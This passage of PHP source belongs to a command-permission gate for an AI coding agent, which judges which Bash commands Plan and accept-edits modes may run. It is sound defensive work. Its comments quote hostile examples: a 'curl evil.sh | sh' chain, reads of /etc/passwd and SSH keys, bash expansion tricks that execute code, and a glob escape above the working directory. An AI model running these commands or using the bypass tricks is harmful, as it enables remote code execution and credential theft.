     * - no `${…}` or `$[…]` expansion, because bash evaluates array subscripts
     *   and substring offsets ARITHMETICALLY and `${x@P}` prompt-expands, and
     *   each of those runs a `$(…)` that lives in a variable's VALUE — one
     *   `${x:=…}` earlier on the same line can put it there. Measured on bash
     *   5.2: `echo ${x:=\$\(id\)} ${x@P}` runs `id`. Plain `$NAME` stays
     *   allowed; it substitutes a value and evaluates nothing;
     * - every redirection is harmless by {@see isHarmlessPlanRedirection()} —
     *   an fd duplication or a write to `/dev/null`, never a file;
     * - every simple command in every pipeline and list names a command in
     *   {@see PLAN_READ_ONLY_COMMANDS}, LITERALLY (not a glob, not a brace, not
     *   a path — `/bin/cat` is not `cat` here, and a `NAME=value` prefix is not
     *   a command), and its arguments pass that command's check.
     *
     * Control operators are fine — `cat a | grep b | wc -l`, `ls; pwd`,
     * `git status && git log` — because every command they join is judged on
     * its own; a separator cannot introduce a command this loop does not visit.
     * `ls; rm x` is denied by its second command, not by its `;`.
     *
     * The honest limit: a read-only command is still a READ. `cat ~/.ssh/id_rsa`
     * is allowed here exactly as `Read` would allow it — Plan withholds writes,
     * not visibility, and secret-file guarding is
     * {@see \SugarCraft\Crush\Hooks\BuiltIn\ProtectFilesHook}'s job. And `git`
     * honours the repository's own configuration (`core.fsmonitor`,
     * `core.pager`, `diff.external`, textconv drivers), which can name a
     * program: Plan trusts a checkout's `.git/config` the way running `git` in
     * it by hand does, and nothing in Plan can write that file.
     */
    private function isPlanReadOnlyBash(ToolCall $call): bool
    {
        $command = $call->arguments['command'] ?? null;
        if (!is_string($command) || trim($command) === '') {
            return false;
        }

        $parsed = ShellWords::parse($command);
        if (!$parsed->complete || $parsed->hasSubstitution() || $parsed->parameterExpansions !== []) {
            return false;
        }

        foreach ($parsed->redirections as $redirection) {
            if (!$this->isHarmlessPlanRedirection($redirection)) {
                return false;
            }
        }

        $judged = false;
        foreach ($parsed->commands as $index => $words) {
            if ($words === []) {
                // Redirections only (`2>/dev/null` on its own) — judged above.
                continue;
            }
            $flags = $parsed->expandable[$index] ?? [];
            $name = $words[0];
            if (($flags[0] ?? true) || !array_key_exists($name, self::PLAN_READ_ONLY_COMMANDS)) {
                return false;
            }
            if (!$this->planArgumentsAreReadOnly($name, array_slice($words, 1), array_slice($flags, 1))) {
                return false;
            }
            $judged = true;
        }

        return $judged;
    }

    /**
     * The commands Plan mode lets `Bash` run, mapped to how their arguments are
     * judged by {@see planArgumentsAreReadOnly()}.
     *
     * AN ALLOW-LIST ON PURPOSE: a command missing from it costs one denied
     * exploration step (the model can use `Read`/`Grep`/`Glob` instead); a
     * writing command wrongly on it costs the guarantee Plan exists to give.
     * Additions need the same scrutiny as a security fix.
     *
     * `null` means no spelling of that command's arguments can write a file or
     * run another program, so its words are not inspected — and therefore a
     * glob or a `$VAR` in them is fine (`cat src/*.php`, `ls $HOME`).
     * A string names the per-command check for the ones where SOME argument
     * writes or executes: `find -delete`/`-exec`, `sort -o`, `uniq IN OUT`,
     * `rg --pre CMD`, `tree -o`, `file -C`, `date -s`, `printf -v` (which
     * evaluates an array subscript, so it runs code — measured), and `git`'s
     * many writing subcommands. A checked command refuses ANY word bash may
     * still rewrite ({@see ShellWords::$expandable}), because `find . {-delete,}`
     * and a file named `-delete` matched by `find *` both hand find a flag no
     * literal word showed.
     *
     * Left out deliberately, with the reason, so nobody re-adds one in passing:
     * `sed`/`awk`/`perl`/`python*`/`php`/`node`/`ruby` (interpreters — `awk`
     * writes with `print > f`, `sed` with `w`); `xargs`, `env`, `sudo`,
     * `nohup`, `timeout`, `nice`, `command`, `exec`, `eval`, `source`/`.`,
     * `bash`/`sh -c`, `time` (each runs ANOTHER command, which would escape
     * this list); `test`/`[` (`[ -v 'a[$(cmd)]' ]` evaluates the subscript and
     * runs `cmd` — measured on bash 5.2); `less`/`more` (interactive, and
     * `LESSOPEN` runs a preprocessor); `xxd` and `tee` (a second operand or
     * any operand is an output file); `curl`/`wget` (network, and `-o`).
     *
     * @var array<string, ?string>
     */
    private const PLAN_READ_ONLY_COMMANDS = [
        'basename' => null,
        'cat' => null,
        'cd' => null,
        'cmp' => null,
        'comm' => null,
        'cut' => null,
        'df' => null,
        'diff' => null,
        'dirname' => null,
        'du' => null,
        'echo' => null,
        'egrep' => null,
        'false' => null,
        'fgrep' => null,
        'grep' => null,
        'head' => null,
        'id' => null,
        'jq' => null,
        'ls' => null,
        'nl' => null,
        'pwd' => null,
        'readlink' => null,
        'realpath' => null,
        'stat' => null,
        'tail' => null,
        'tr' => null,
        'true' => null,
        'type' => null,
        'uname' => null,
        'wc' => null,
        'whereis' => null,
        'which' => null,
        'whoami' => null,
        'date' => 'date',
        'file' => 'file',
        'find' => 'find',
        'git' => 'git',
        'printf' => 'printf',
        'rg' => 'rg',
        'sort' => 'sort',
        'tree' => 'tree',
        'uniq' => 'uniq',
    ];

    /**
     * `find` primaries that delete, run a program or write a file. Matched
     * against quote-removed words, so `'-delete'` is caught too.
     */
    private const PLAN_FIND_REFUSED = [
        '-delete', '-exec', '-execdir', '-ok', '-okdir',
        '-fprint', '-fprint0', '-fprintf', '-fls',
    ];

    /**
     * `git` subcommands Plan can run, each further narrowed by
     * {@see planGitIsReadOnly()}. Anything else — `commit`, `push`, `checkout`,
     * `reset`, `stash`, `fetch`, an alias (which may be `!shell`) — is denied.
     */
    private const PLAN_GIT_SUBCOMMANDS = [
        'status', 'log', 'show', 'diff', 'blame', 'shortlog', 'rev-parse', 'rev-list',
        'ls-files', 'ls-tree', 'describe', 'cat-file', 'grep', 'branch', 'tag', 'remote', 'config',
    ];

    /**
     * Output targets a Plan-mode redirection may name: writing to them changes
     * no file.
     */
    private const PLAN_HARMLESS_OUTPUT_TARGETS = ['/dev/null', '/dev/stdout', '/dev/stderr'];

    /**
     * A redirection Plan can allow — judged on the operator AND the target,
     * because the old check's mistake was judging spacing.
     *
     * - `2>&1`, `>&2`, `3<&0`, `2>&-`: fd duplication / closing, no file.
     * - `>`, `>>`, `>|`, `&>`, `&>>` (and `>& word`, which bash reads as
     *   `&> word`) only onto {@see PLAN_HARMLESS_OUTPUT_TARGETS} — so
     *   `cmd 2>/dev/null` is allowed and `cmd 2> f` is not, in any spacing.
     * - `<` reads a file, so any target — except bash's `/dev/tcp/…` and
     *   `/dev/udp/…`, which open a network connection rather than a file.
     * - `<<<` feeds a word to stdin; the word was already parsed, and any
     *   substitution in it already refused the line.
     * - Refused: `<>` opens read-WRITE (creating the file), and `<<`/`<<-`
     *   here-doc bodies are expanded by bash (`$(…)` in a body runs) but are
     *   skipped, unparsed, by {@see ShellWords} — so nothing here has looked
     *   at them.
     *
     * @param array{command: int, fd: ?string, op: string, target: ?string} $redirection
     */
    private function isHarmlessPlanRedirection(array $redirection): bool
    {
        $target = $redirection['target'] ?? '';

        return match ($redirection['op']) {
            '>&' => preg_match('/^(?:\d+-?|-)$/', $target) === 1
                || in_array($target, self::PLAN_HARMLESS_OUTPUT_TARGETS, true),
            '<&' => preg_match('/^(?:\d+-?|-)$/', $target) === 1,
            '>', '>>', '>|', '&>', '&>>' => in_array($target, self::PLAN_HARMLESS_OUTPUT_TARGETS, true),
            '<' => !str_starts_with($target, '/dev/tcp/') && !str_starts_with($target, '/dev/udp/'),
            '<<<' => true,
            default => false,
        };
    }

    /**
     * @param list<string> $args  the words after the command name
     * @param list<bool>   $flags {@see ShellWords::$expandable} for those words
     */
    private function planArgumentsAreReadOnly(string $name, array $args, array $flags): bool
    {
        $check = self::PLAN_READ_ONLY_COMMANDS[$name];
        if ($check === null) {
            return true;
        }
        if (count($flags) !== count($args) || in_array(true, $flags, true)) {
            return false;
        }

        return match ($check) {
            'find' => array_intersect($args, self::PLAN_FIND_REFUSED) === [],
            'git' => $this->planGitIsReadOnly($args),
            // `-o FILE` / `--output` writes; `--compress-program` runs a
            // program; `-T DIR` / `--temporary-directory` writes there. GNU
            // getopt clusters short options (`-uo f`) and accepts any
            // unambiguous long-option prefix (`--out=f`), hence the shape.
            'sort' => $this->noOptionMatches($args, '/^-[^-]*[oT]|^--(?:o|com|te)/'),
            // `uniq [OPTION]... [INPUT [OUTPUT]]` — a second operand is
            // written. Option values must be attached (`-f1`, not `-f 1`):
            // a detached value counts as an operand, which only over-refuses.
            'uniq' => $this->operandCount($args) <= 1,
            // `--pre CMD` runs CMD on every file; `--hostname-bin` runs one too.
            'rg' => $this->noOptionMatches($args, '/^--(?:pre|hostname-bin)/'),
            // `-o FILE` writes the listing; `-R` (with `-H`) writes
            // `00Tree.html` into every directory.
            'tree' => $this->noOptionMatches($args, '/^-[^-]*[oR]|^--o/'),
            // `-C` / `--compile` writes a compiled `.mgc` magic file.
            'file' => $this->noOptionMatches($args, '/^-[^-]*C|^--co/'),
            'date' => $this->planDateIsReadOnly($args),
            // `printf -v NAME` assigns, and a NAME of `a[$(cmd)]` runs `cmd`
            // (the subscript is evaluated arithmetically — measured). Only a
            // FORMAT may come first.
            'printf' => $args === [] || $args[0] === '--' || !str_starts_with($args[0], '-'),
            default => false,
        };
    }

    /**
     * True when no OPTION word (one starting with `-`, other than a bare `-`)
     * before a `--` matches `$refused`.
     *
     * @param list<string> $args
     */
    private function noOptionMatches(array $args, string $refused): bool
    {
        foreach ($args as $arg) {
            if ($arg === '--') {
                return true;
            }
            if ($arg !== '-' && str_starts_with($arg, '-') && preg_match($refused, $arg) === 1) {
                return false;
            }
        }

        return true;
    }

    /**
     * The number of operands (non-option words, and every word after `--`).
     *
     * @param list<string> $args
     */
    private function operandCount(array $args): int
    {
        $count = 0;
        $optionsEnded = false;
        foreach ($args as $arg) {
            if (!$optionsEnded && $arg === '--') {
                $optionsEnded = true;
                continue;
            }
            if (!$optionsEnded && $arg !== '-' && str_starts_with($arg, '-')) {
                continue;
            }
            ++$count;
        }

        return $count;
    }

    /**
     * `date` DISPLAYS with `+FORMAT`, `-u`, `-R`, `-I…`, `-d DATE`,
     * `-r FILE` and `-f FILE`, and SETS the clock with `-s`/`--set` or a bare
     * `MMDDhhmm` operand. An allow-list of the display forms, since a
     * deny-list would have to know every way an operand can look like a date.
     *
     * @param list<string> $args
     */
    private function planDateIsReadOnly(array $args): bool
    {
        $count = count($args);
        for ($i = 0; $i < $count; ++$i) {
            $arg = $args[$i];
            if (in_array($arg, ['-d', '--date', '-r', '--reference', '-f', '--file'], true)) {
                ++$i; // the next word is that option's value, not an operand
                continue;
            }
            if (str_starts_with($arg, '+')
                || in_array($arg, ['-u', '--utc', '--universal', '-R', '--rfc-email', '--debug'], true)
                || preg_match('/^(?:-I[a-z]*|--iso-8601(?:=[a-z]+)?|--rfc-3339=[a-z]+|--(?:date|reference|file)=.*|-[dfr].+)$/', $arg) === 1
            ) {
                continue;
            }

            return false;
        }

        return true;
    }

    /**
     * `git`, narrowed to inspection. Global options before the subcommand are
     * refused except `--no-pager`/`-P`: `-c core.pager=CMD`, `--exec-path`,
     * `-C`, `--git-dir` all change what runs or where.
     *
     * @param list<string> $args the words after `git`
     */
    private function planGitIsReadOnly(array $args): bool
    {
        while ($args !== [] && in_array($args[0], ['--no-pager', '-P'], true)) {
            array_shift($args);
        }
        $subcommand = array_shift($args);
        if ($subcommand === null || !in_array($subcommand, self::PLAN_GIT_SUBCOMMANDS, true)) {
            return false;
        }

        return match ($subcommand) {
            'branch' => $this->planGitListingIsReadOnly(
                $args,
                ['-a', '--all', '-r', '--remotes', '-v', '-vv', '--verbose', '--show-current', '--color',
                    '--no-color', '--column', '--no-column', '-i', '--ignore-case', '--omit-empty', '--no-abbrev'],
                ['-l', '--list'],
                '/^-[arvil]+$/',
                '/l/',
            ),
            'tag' => $this->planGitListingIsReadOnly(
                $args,
                ['-i', '--ignore-case', '--color', '--no-color', '--column', '--no-column', '--omit-empty'],
                ['-l', '--list', '-n'],
                '/^-(?:[il]+|n\d*)$/',
                '/[ln]/',
            ),
            'remote' => $this->planGitRemoteIsReadOnly($args),
            'config' => $this->planGitConfigIsReadOnly($args),
            default => $this->planGitInspectionIsReadOnly($subcommand, $args),
        };
    }

    /**
     * `log`, `show`, `diff`, `blame`, `grep` and the plumbing readers. Their
     * one write is `--output=FILE` (log/show/diff), and `git grep -O CMD` /
     * `--open-files-in-pager` runs a program. git accepts any unambiguous
     * long-option prefix (`--out=f`), so every `--o…` option is refused except
     * the read-only ones a model actually types. Words after `--` are
     * pathspecs.
     *
     * @param list<string> $args
     */
    private function planGitInspectionIsReadOnly(string $subcommand, array $args): bool
    {
        foreach ($args as $arg) {
            if ($arg === '--') {
                return true;
            }
            if (str_starts_with($arg, '--o')
                && !in_array($arg, ['--oneline', '--only-matching', '--ours'], true)
            ) {
                return false;
            }
            if ($subcommand === 'grep' && preg_match('/^-[^-]*O/', $arg) === 1) {
                return false;
            }
        }

        return true;
    }

    /**
     * `git branch` / `git tag` LIST with no arguments, with `--list`, or with
     * a filter (`--contains`, `--merged`, `--points-at` — git switches to list
     * mode for those itself), and otherwise treat a bare operand as the name of
     * a branch or tag to CREATE. So an operand is allowed only in list mode,
     * and every option must be a known listing option.
     *
     * A filter's value is skipped only when it does not start with `-`: git
     * itself takes `--contains -d x` as `--contains` (defaulted) and then
     * `-d x`, a delete — consuming `-d` as a value here would miss it.
     *
     * @param list<string> $args
     * @param list<string> $plainOptions options that neither list nor take a value
     * @param list<string> $listOptions  options that switch to list mode
     * @param string       $cluster      a regex for a valid short-option cluster
     * @param string       $listInCluster which cluster letters switch to list mode
     */
    private function planGitListingIsReadOnly(
        array $args,
        array $plainOptions,
        array $listOptions,
        string $cluster,
        string $listInCluster,
    ): bool {
        $listMode = false;
        $operand = false;
        $count = count($args);
        for ($i = 0; $i < $count; ++$i) {
            $arg = $args[$i];
            $isFilter = in_array($arg, ['--contains', '--no-contains', '--merged', '--no-merged', '--points-at'], true);
            if ($isFilter || in_array($arg, ['--sort', '--format'], true)) {
                $listMode = $listMode || $isFilter;
                if ($i + 1 < $count && !str_starts_with($args[$i + 1], '-')) {
                    ++$i;
                }
                continue;
            }
            if (preg_match('/^--(?:contains|no-contains|merged|no-merged|points-at)=/', $arg) === 1) {
                $listMode = true;
                continue;
            }
            if (preg_match('/^--(?:sort|format|color|column|abbrev)=/', $arg) === 1
                || in_array($arg, $plainOptions, true)
            ) {
                continue;
            }
            if (in_array($arg, $listOptions, true)) {
                $listMode = true;
                continue;
            }
            if (preg_match($cluster, $arg) === 1) {
                $listMode = $listMode || preg_match($listInCluster, $arg) === 1;
                continue;
            }
            if (str_starts_with($arg, '-')) {
                return false;
            }
            $operand = true;
        }

        return !$operand || $listMode;
    }

    /**
     * `git remote`, `git remote -v`, `git remote get-url …` and
     * `git remote show …` read; `add`/`remove`/`rename`/`set-url`/`prune`
     * write.
     *
     * @param list<string> $args
     */
    private function planGitRemoteIsReadOnly(array $args): bool
    {
        while ($args !== [] && in_array($args[0], ['-v', '--verbose'], true)) {
            array_shift($args);
        }
        if ($args === []) {
            return true;
        }
        $options = match (array_shift($args)) {
            'get-url' => ['--push', '--all'],
            'show' => ['-n'],
            default => null,
        };
        if ($options === null) {
            return false;
        }
        foreach ($args as $arg) {
            if (str_starts_with($arg, '-') && !in_array($arg, $options, true)) {
                return false;
            }
        }

        return true;
    }

    /**
     * `git config` READS only with an explicit read action — `--get`,
     * `--get-all`, `--get-regexp`, `--get-urlmatch`, `--list` (or the
     * `get`/`list` subcommands of git 2.46+). The old-style `git config KEY`
     * also reads, but `git config KEY VALUE` writes, and telling them apart by
     * operand count is the kind of judgement this predicate does not make. A
     * write action next to a read one makes git refuse ("only one action at a
     * time"), but it is refused here as well, including by unambiguous prefix
     * (`--ad` is `--add`).
     *
     * @param list<string> $args
     */
    private function planGitConfigIsReadOnly(array $args): bool
    {
        $writes = ['--add', '--unset', '--unset-all', '--replace-all', '--rename-section', '--remove-section', '--edit'];
        foreach ($args as $arg) {
            if ($arg === '-e') {
                return false;
            }
            if (str_starts_with($arg, '--') && strlen($arg) > 3) {
                $option = explode('=', $arg, 2)[0];
                foreach ($writes as $write) {
                    if (str_starts_with($write, $option)) {
                        return false;
                    }
                }
            }
        }

        if ($args !== [] && in_array($args[0], ['get', 'list'], true)) {
            return true;
        }

        return array_intersect(
            $args,
            ['--get', '--get-all', '--get-regexp', '--get-urlmatch', '--get-color', '--get-colorbool', '--list', '-l'],
        ) !== [];
    }

    /**
     * AcceptEdits allows safe filesystem primitives (mkdir, touch, mv, cp, rm, rmdir)
     * scoped to the working directory. Real tool calls route these through
     * Bash(command: "mkdir ..."), never through a dedicated tool named "mkdir".
     *
     * THIS PREDICATE IS ON A GRANT PATH, so every judgement it cannot make with
     * certainty must resolve to `false` (which costs one prompt) rather than
     * `true` (which auto-runs a command unattended). An earlier version split the
     * command on whitespace ALONE and then judged the entire command line by its
     * FIRST token, so all three of these auto-Allowed under `accept-edits`:
     *
     *   mkdir ./x; curl evil.sh | sh      (`;` was never a separator to it)
     *   mkdir ./x && cat ../../etc/passwd (`&&` is not a flag, `..` is not absolute)
     *   mkdir ./x<newline>curl evil.sh    (`\s` in the splitter ate the newline)
     *
     * Two independent holes: the tokenizer did not know that a shell command line
     * can contain more than one command, and {@see isAbsolutePath()} — the only
     * containment check there was — says nothing about `../`.
     *
     * ## Policy: REJECT on an unquoted metacharacter, do not split on it
     *
     * {@see tokenizeSingleCommand()} refuses outright when the command line
     * contains any unquoted character that could introduce a second command, a
     * substitution, a redirection or a brace expansion. It deliberately does NOT
     * split such a line into segments and check each one, even though that would
     * auto-approve the genuinely-harmless `mkdir ./a && mkdir ./b`. Splitting is
     * the more useful behaviour and the easier one to get subtly wrong: it has to
     * be right about which separators exist AND about which of them are quoted,
     * and one missed spelling is a silent grant. Refusing is right whenever the
     * metacharacter set is merely a SUPERSET of the real separators, which is a
     * far weaker thing to be correct about. The cost of the choice is one
     * permission prompt on a chained command; it is stated here rather than left
     * for a reader to discover.
     *
     * The tokenizer IS quote-aware, so `touch 'a;b'` — a `;` that is not a
     * separator — remains a single scoped write, and `mkdir "my dir"` is one path
     * argument rather than the two that a whitespace split produced.
     *
     * ## Containment
     *
     * Every path argument must be relative AND stay strictly below the working
     * directory, checked lexically by {@see isContainedRelativePath()}. Lexically
     * because `mkdir ./x` names a directory that does not exist yet, so
     * `realpath()` — which returns false for a missing path — cannot be the
     * check. "Strictly below" also rejects the root itself: `rm -rf .` and
     * `rm -rf ./` are prompts, not grants.
     *
     * ## Honest limits — each of these is a decision, not an oversight
     *
     * - SYMLINKS ARE NOT RESOLVED. `rm ./link-that-points-outside` is spelled as a
     *   contained relative path and is treated as one. Resolving it would mean
     *   touching the filesystem, which this class does not do, and would still be
     *   a TOCTOU race against the command it is approving. Callers wanting real
     *   containment need it enforced where the command runs, not here.
     * - GLOBS ARE NOT EXPANDED. `rm ./*` is judged as the literal token `./*`.
     *   A glob cannot introduce a command and cannot escape the directory it is
     *   anchored in, but `{a,b}` brace expansion CAN (`{.,..}/x`), which is why
     *   `{`/`}` are in the rejected metacharacter set and `*`/`?`/`[` are not.
     *
     *   THE SECOND HALF OF THAT SENTENCE IS TRUE ONLY UNDER BASH, and this
     *   class cannot see the reason. "A glob cannot escape the directory it is
     *   anchored in" is a property of the SHELL, not of the pattern: bash
     *   excludes `.` and `..` from glob results, so `./.<star>/` stays literal.
     *   Dash does not. MEASURED under `/bin/sh`, `./.<star>/` expands to
     *   `./../`, which turns the auto-Allowed `cp ./payload ./.<star>/victim`
     *   into a real write — and a real delete — one directory above the
     *   working directory.
     *
     *   What makes the omission safe is that
     *   {@see \SugarCraft\Crush\Tools\BuiltIn\Bash} spawns every approved
     *   command through `bash -c`. That is a constant in a DIFFERENT file,
     *   which this class neither references nor depends on, and nothing in the
     *   type system connects them. **If that wrapper ever becomes `sh -c`,
     *   leaving `*` out of {@see SHELL_METACHARS} becomes a live grant escape**
     *   and `*`/`?`/`[` must be added to the set.
     *
     *   `PermissionGateScopedWriteTest::testTheBashToolStillSpawnsThroughBashNotSh()`
     *   is the tripwire for that change. It is a source-string assertion, so it
     *   catches an edit to the wrapper, not a host where `bash` is really dash.
     * - The command word is compared CASE-SENSITIVELY, unlike
     *   {@see segmentIsRmRfRootOrHome()}, which lowercases. The asymmetry is the
     *   point: lowercasing widens a DENY list (safe) and widens an ALLOW list
     *   (not safe). `MKDIR ./x` used to auto-Allow here — on a case-sensitive
     *   filesystem that is not `mkdir` at all but whatever `MKDIR` resolves to.
     * - A command spelled with a path or a prefix (`/bin/mkdir`, `./mkdir`,
     *   `sudo mkdir`, `env mkdir`) is not in {@see SCOPED_WRITE_COMMANDS} and so
     *   prompts. That was already true and is kept deliberately.
     */
    private function isScopedWriteTool(ToolCall $call): bool
    {
        if ($call->name !== 'Bash') {
            return false;
        }

        $args = $call->arguments;
        if (!isset($args['command']) || !is_string($args['command'])) {
            return false;
        }

        $tokens = $this->tokenizeSingleCommand($args['command']);
        if ($tokens === null || $tokens === []) {
            return false;
        }

        // Case-sensitive on purpose — see the "honest limits" block above.
        $command = array_shift($tokens);
        if (!in_array($command, self::SCOPED_WRITE_COMMANDS, true)) {
            return false;
        }

        $paths = [];
        $endOfOptions = false;

        foreach ($tokens as $token) {
            if (!$endOfOptions && $token === '--') {
                $endOfOptions = true;
                continue;
            }

            // A bare `-` is a filename, not a flag — the same call this file's
            // `rm -rf` breaker already makes in segmentIsRmRfRootOrHome().
            if (!$endOfOptions && $token !== '-' && str_starts_with($token, '-')) {
                if (!$this->isPermittedScopedWriteFlag($token)) {
                    return false;
                }
                continue;
            }

            $paths[] = $token;
        }

        if ($paths === []) {
            return false;
        }

        foreach ($paths as $path) {
            if (!$this->isContainedRelativePath($path)) {
                return false;
            }
        }

        return true;
    }

    /**
     * Characters that are refused when they appear OUTSIDE quotes: each can
     * introduce a second command (`| & ; newline`), a substitution (`$` and
     * backtick), a redirection (`< >`), a subshell (`( )`), a brace expansion
     * that can escape the directory (`{ }`), a history expansion (`!`), or an
     * escape that would desynchronise the quote scanner (`\`).
     */
    private const SHELL_METACHARS = "|&;<>()\$`\\{}!\n\r";

    /**
     * Characters still ACTIVE inside double quotes. Single quotes make everything
     * literal; double quotes do not, so `"$(id)"` and "`id`" have to be refused
     * even though they are quoted.
     */
    private const DOUBLE_QUOTE_ACTIVE_CHARS = "\$`\\";

    /**
     * Short flag letters accepted in a scoped write, as a cluster (`-rf`) or
     * singly (`-p`): parents, force, interactive, recursive (both spellings),
     * verbose, no-clobber, dir.
     *
     * A WHITELIST, because the alternative — "anything starting with `-` is a
     * flag, skip it" — silently skipped flags that TAKE A PATH: `mv -t ../../etc
     * ./x` passed the old containment loop because `-t` was skipped and
     * `../../etc` was merely non-absolute. An unlisted flag yields Ask, i.e. a
     * prompt, not a refusal of the operation.
     */
    private const SCOPED_WRITE_SHORT_FLAGS = 'pfirRvnd';

    /**
     * Long-flag spellings of the same set. `--target-directory` is deliberately
     * absent: it takes a path, and its `=`-attached form would hide that path
     * inside a token this loop treats as a flag.
     *
     * @var string[]
     */
    private const SCOPED_WRITE_LONG_FLAGS = [
        '--parents',
        '--recursive',
        '--force',
        '--verbose',
        '--interactive',
        '--no-clobber',
        '--dir',
    ];

    /**
     * Split a command line into words the way a shell would, but ONLY when the
     * line is unambiguously a single simple command.
     *
     * Returns null — meaning "not a single scoped command, do not grant" — when
     * an unquoted {@see SHELL_METACHARS} character appears, when a
     * {@see DOUBLE_QUOTE_ACTIVE_CHARS} character appears inside double quotes, or
     * when a quote is left unterminated. Otherwise returns the words with their
     * quotes removed.
     *
     * @return string[]|null
     */
    private function tokenizeSingleCommand(string $command): ?array
    {
        $tokens = [];
        $current = '';
        $inWord = false;
        $quote = null;
        $length = strlen($command);

        for ($i = 0; $i < $length; ++$i) {
            $char = $command[$i];

            if ($quote === "'") {
                if ($char === "'") {
                    $quote = null;
                    continue;
                }
                $current .= $char;
                continue;
            }

            if ($quote === '"') {
                if ($char === '"') {
                    $quote = null;
                    continue;
                }
                if (str_contains(self::DOUBLE_QUOTE_ACTIVE_CHARS, $char)) {
                    return null;
                }
                $current .= $char;
                continue;
            }

            if ($char === "'" || $char === '"') {
                $quote = $char;
                $inWord = true;
                continue;
            }

            if ($char === ' ' || $char === "\t") {
                if ($inWord) {
                    $tokens[] = $current;
                    $current = '';
                    $inWord = false;
                }
                continue;
            }

            if (str_contains(self::SHELL_METACHARS, $char)) {
                return null;
            }

            $current .= $char;
            $inWord = true;
        }

        // An unterminated quote means the tokenization above is a guess.
        if ($quote !== null) {
            return null;
        }

        if ($inWord) {
            $tokens[] = $current;
        }

        return $tokens;
    }

    /**
     * Is `$token` a flag this predicate is willing to skip over?
     *
     * @see SCOPED_WRITE_SHORT_FLAGS for why this is a whitelist rather than a
     *      "starts with a dash" test.
     */
    private function isPermittedScopedWriteFlag(string $token): bool
    {
        if (str_starts_with($token, '--')) {
            return in_array($token, self::SCOPED_WRITE_LONG_FLAGS, true);
        }

        $cluster = substr($token, 1);
        if ($cluster === '') {
            return false;
        }

        for ($i = 0, $length = strlen($cluster); $i < $length; ++$i) {
            if (!str_contains(self::SCOPED_WRITE_SHORT_FLAGS, $cluster[$i])) {
                return false;
            }
        }

        return true;
    }

    /**
     * Does `$path` name something strictly below the working directory?
     *
     * Resolved LEXICALLY — no filesystem access — because the paths this gate
     * approves routinely do not exist yet (`mkdir ./x` is the whole point) and
     * `realpath()` returns false for those. Each `..` pops one segment; a `..`
     * with nothing to pop means the path escapes, and a path that resolves to
     * depth 0 IS the working directory rather than something inside it, so
     * `rm -rf .` prompts.
     */
    private function isContainedRelativePath(string $path): bool
    {
        if ($path === '' || $this->isAbsolutePath($path)) {
            return false;
        }

        $depth = 0;

        foreach (explode('/', $path) as $segment) {
            if ($segment === '' || $segment === '.') {
                continue;
            }

            if ($segment === '..') {
                if ($depth === 0) {
                    return false;
                }
                --$depth;
                continue;
            }

            ++$depth;
        }

        return $depth > 0;
    }

    private function isAbsolutePath(string $path): bool
    {
        return str_starts_with($path, '/') || str_starts_with($path, '~');
    }
}
